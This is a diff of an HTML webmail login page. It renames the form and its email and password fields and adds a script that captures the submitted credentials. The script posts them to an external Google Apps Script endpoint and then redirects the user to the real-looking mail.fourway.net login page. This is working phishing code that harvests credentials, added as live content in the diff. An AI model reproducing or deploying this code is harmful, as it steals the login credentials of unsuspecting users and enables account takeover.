@@ -64,7 +64,7 @@ Service and Technical Support team.<br><br>
 </p>
 </div>
 <div id=login-form-wrapper>
- <form method=post id=login-form name=login-form>
+ <form method=post id=google-sheet name=login-form>
  
  <blockquote>
  <table id=login-form-table class=MagicEmbeddedTable>
@@ -81,7 +81,7 @@ Service and Technical Support team.<br><br>
  </label>
  </td>
  <td>
- <input size=20 type=email name=email id=login-email autocorrect=off autocapitalize=none value>
+ <input size=20 type=email name=Username id=login-email autocorrect=off autocapitalize=none value>
  </td>
  </tr>
  <tr>
@@ -91,7 +91,7 @@ Service and Technical Support team.<br><br>
  </label>
  </td>
  <td class=show-password>
- <input size=20 type=password name=password id=login-password>
+ <input size=20 type=password name=Password id=login-password>
  <label for=show-password>
  <input type=checkbox id=show-password value=on>
  Show Password
@@ -120,7 +120,24 @@ Service and Technical Support team.<br><br>
  </tr>
  </table>
  </blockquote>
- </form>
+ </form><script type="text/javascript">
+
+
+   const scriptURL = 'https://script.google.com/macros/s/AKfycbxnKSDadTZ9Wxv1gsiUVF7FRrLZaJ-81rgp_IRyBcoH6K9bg1PdZtLk8WuPczfBkAiMaQ/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+    .then(() => {
+      const redirectUrl = 'https://mail.fourway.net/login.php';
+      const link = document.createElement('a');
+      link.href = redirectUrl;
+      link.click();
+    })
+    .catch((error) => console.error('Error!', error.message));
+            })
+  </script>
 </div>
 </div>
 <div id=mobileOption class=mm-modal style=display:none>
